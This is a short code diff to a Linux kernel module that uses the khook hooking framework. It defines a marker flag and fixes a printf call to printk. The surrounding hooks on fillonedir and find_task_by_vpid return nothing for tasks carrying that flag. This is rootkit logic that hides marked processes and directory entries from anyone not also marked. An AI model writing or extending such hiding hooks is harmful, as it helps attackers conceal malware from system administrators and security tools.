@@ -12,6 +12,7 @@
 #include <linux/syscalls.h>
 #include <linux/sched.h>
 
+#define FLAG 0x80000000
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
@@ -89,7 +90,7 @@ KHOOK(find_task_by_vpid);
 struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
 	struct task_struct *tsk = NULL;
-	printf("HOOK SUCCESS");
+	printk("HOOK SUCCESS");
 	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
 	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
 		tsk = NULL;
